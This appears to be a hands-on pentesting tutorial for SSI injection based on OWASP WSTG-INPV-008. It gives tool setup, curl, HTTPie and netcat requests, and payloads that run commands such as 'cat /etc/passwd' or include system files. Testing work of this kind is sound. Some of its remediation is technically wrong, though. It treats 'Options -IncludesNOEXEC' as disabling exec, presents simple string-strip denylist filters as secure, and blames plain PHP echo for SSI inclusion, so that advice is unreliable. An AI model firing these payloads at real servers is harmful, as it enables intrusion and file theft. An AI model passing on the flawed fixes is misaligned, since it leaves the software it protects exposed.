# Testing for SSI Injection Vulnerabilities

## Overview

Testing for Server-Side Includes (SSI) Injection vulnerabilities involves verifying that a web application properly sanitizes user input used in SSI directives to prevent attackers from executing arbitrary server-side commands or including malicious content. According to OWASP (WSTG-INPV-008), SSI Injection occurs when untrusted input is processed within SSI directives (e.g., `<!--#exec -->`, `<!--#include -->`), enabling attackers to read sensitive files, execute system commands, or manipulate server responses. This guide provides a hands-on methodology to test for SSI Injection vulnerabilities, focusing on input vectors, basic SSI injection, file inclusion, command execution, and conditional directive manipulation, with tools, commands, payloads, and remediation strategies.

**Impact**: SSI Injection vulnerabilities can lead to:
- Unauthorized access to sensitive server files (e.g., `/etc/passwd`).
- Execution of arbitrary system commands (e.g., `whoami`, `cat`).
- Exposure of server configuration or environment variables.
- Denial-of-service (DoS) by overloading server resources.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-008, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as SSI injection attempts may execute harmful commands, access restricted files, or disrupt server operations.

## Testing Tools

The following tools are recommended for testing SSI Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject SSI payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for SSI directive outputs or errors.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom injection rules; manually verify findings due to limited SSI support.

- **cURL and HTTPie**: Send HTTP requests with SSI payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?input=<!--#exec%20cmd=\"whoami\"-->"
      # HTTPie
      http "http://example.com/page?input==<!--#exec cmd=\"whoami\"-->"
      ```

- **Postman**: GUI tool for testing SSI injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to SSI payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for server output.
  - **Note**: Firefox’s 2025 network analysis improvements enhance response inspection.

- **Netcat (nc)**: Tests server responses for SSI injection.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /page?input=<!--#exec cmd=\"whoami\"--> HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-008, testing SSI Injection vulnerabilities across input vectors, basic SSI injection, file inclusion, command execution, and conditional directive manipulation.

### Common SSI Injection Payloads

Below is a list of common SSI Injection payloads to test various server behaviors. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid unintended consequences.

- **Basic SSI Directives**:
  - `<!--#echo var="DATE_LOCAL" -->` (Displays server date)
  - `<!--#printenv -->` (Lists environment variables)
  - `<!--#config timefmt="%Y-%m-%d" -->` (Sets time format)

- **File Inclusion**:
  - `<!--#include file="config.txt" -->` (Includes local file)
  - `<!--#include virtual="/etc/passwd" -->` (Includes server file)

- **Command Execution**:
  - `<!--#exec cmd="whoami" -->` (Runs system command)
  - `<!--#exec cmd="cat /etc/passwd" -->` (Reads file via command)
  - `<!--#exec cmd="id" -->` (Displays user info)

- **Conditional Directives**:
  - `<!--#if expr="$QUERY_STRING = test" --><p>Success</p><!--#endif -->` (Tests condition)
  - `<!--#set var="test" value="malicious" -->` (Sets variable)

- **Encoded Payloads**:
  - `<!--%23exec%20cmd=%22whoami%22-->` (URL-encoded)
  - `<!--#exec cmd=\"whoami\" -->` (Quoted command)

**Note**: SSI directives depend on server configuration (e.g., Apache with `mod_include` enabled). Test payloads in URL parameters, form fields, or headers where input is reflected.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that may be processed by SSI directives.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, search fields, or URLs that may process SSI (e.g., `.shtml` pages).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `input=test`, `query=hello`).
3. Inspect responses:
   - Check for `.shtml` extensions or SSI-like output (e.g., server time).
   - Use Developer Tools (`Ctrl+Shift+I`) to search for SSI directives in HTML.
4. List input vectors:
   - Document query parameters, form fields, headers, and cookies.

**Example Input Vectors**:
- URL: `http://example.com/page.shtml?input=test`
- Form: `<input name="query">`
- Header: `X-Custom: test`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['input'])) die("Invalid input");
  ```
- Disable SSI processing:
  ```apache
  Options -Includes
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for Basic SSI Injection

**Objective**: Verify if user input can trigger SSI directives.

**Steps**:
1. Identify input fields:
   - Look for parameters or forms reflected in responses.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     GET /page.shtml?input=<!--#echo var="DATE_LOCAL" --> HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page.shtml?input=<!--#echo var=\"DATE_LOCAL\" -->"
     ```
3. Check responses:
   - Look for server data (e.g., current date) or SSI output.
4. Test other directives:
   - Try: `<!--#printenv -->` to list environment variables.

**Example Vulnerable Configuration (Apache)**:
```apache
Options +Includes
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```
Test: `?input=<!--#echo var="DATE_LOCAL" -->`
Result: Displays server date.

**Example Secure Configuration (Apache)**:
```apache
Options -Includes
```
Test: No SSI output.

**Remediation**:
- Disable SSI in server configuration:
  ```apache
  Options -Includes
  ```
- Sanitize inputs:
  ```php
  $input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
  ```

**Tip**: Save SSI output in a report.

### 3. Test for SSI File Inclusion

**Objective**: Check if SSI directives can include sensitive server files.

**Steps**:
1. Inject file inclusion payloads:
   - Use Burp:
     ```http
     GET /page.shtml?input=<!--#include file="config.txt" --> HTTP/1.1
     Host: example.com
     ```
   - Use HTTPie:
     ```bash
     http "http://example.com/page.shtml?input==<!--#include file=\"config.txt\" -->"
     ```
2. Check responses:
   - Look for file contents (e.g., `config.txt` data).
   - Test sensitive files: `<!--#include virtual="/etc/passwd" -->`.
3. Test encoded payloads:
   - Try: `<!--%23include%20file=%22config.txt%22-->`.

**Example Vulnerable Code (PHP)**:
```php
echo $_GET['input'];
```
Test: `?input=<!--#include file="/etc/passwd" -->`
Result: Displays `/etc/passwd`.

**Example Secure Code (PHP)**:
```php
$input = preg_replace('/<!--#.*-->/', '', $_GET['input']);
echo $input;
```
Test: No file inclusion.

**Remediation**:
- Disable file inclusion:
  ```apache
  Options -Includes
  ```
- Restrict file access:
  ```apache
  <Files ~ "\.(txt|conf)$">
      Deny from all
  </Files>
  ```

**Tip**: Save included file contents in a report.

### 4. Test for SSI Command Execution

**Objective**: Verify if SSI directives can execute system commands.

**Steps**:
1. Inject command execution payloads:
   - Use Burp:
     ```http
     GET /page.shtml?input=<!--#exec cmd="whoami" --> HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page.shtml?input=<!--#exec cmd=\"whoami\" -->"
     ```
2. Check responses:
   - Look for command output (e.g., `apache` or `www-data`).
   - Test other commands: `<!--#exec cmd="id" -->`, `<!--#exec cmd="cat /etc/passwd" -->`.
3. Test with Netcat:
   ```bash
   echo -e "GET /page.shtml?input=<!--#exec cmd=\"whoami\"--> HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
   ```

**Example Vulnerable Configuration (Apache)**:
```apache
Options +Includes
AddOutputFilter INCLUDES .shtml
```
Test: `?input=<!--#exec cmd="whoami" -->`
Result: Displays `www-data`.

**Example Secure Configuration (Apache)**:
```apache
Options -IncludesNOEXEC
```
Test: No command output.

**Remediation**:
- Disable command execution:
  ```apache
  Options -IncludesNOEXEC
  ```
- Filter SSI directives:
  ```php
  $input = str_replace('<!--#exec', '', $input);
  ```

**Tip**: Save command outputs in a report.

### 5. Test for Conditional SSI Directive Manipulation

**Objective**: Check if conditional SSI directives can be manipulated to alter server logic.

**Steps**:
1. Inject conditional payloads:
   - Use Burp:
     ```http
     GET /page.shtml?input=<!--#if expr="$QUERY_STRING = test" --><p>Success</p><!--#endif --> HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page.shtml?input=<!--#if expr=\"$QUERY_STRING = test\" --><p>Success</p><!--#endif -->"
     ```
2. Check responses:
   - Look for conditional output (e.g., `<p>Success</p>`).
   - Test variable setting: `<!--#set var="test" value="malicious" -->`.
3. Test logic bypass:
   - Try: `<!--#if expr="1=1" -->`.

**Example Vulnerable Code (Apache)**:
```apache
Options +Includes
```
Test: `?input=<!--#if expr="$QUERY_STRING = test" --><p>Success</p><!--#endif -->`
Result: Displays `<p>Success</p>`.

**Example Secure Code (PHP)**:
```php
$input = preg_replace('/<!--#if.*-->/', '', $_GET['input']);
echo $input;
```
Test: No conditional output.

**Remediation**:
- Disable SSI conditionals:
  ```apache
  Options -Includes
  ```
- Validate input for directives:
  ```php
  if (preg_match('/<!--#/', $input)) die("Invalid input");
  ```

**Tip**: Save conditional outputs in a report.
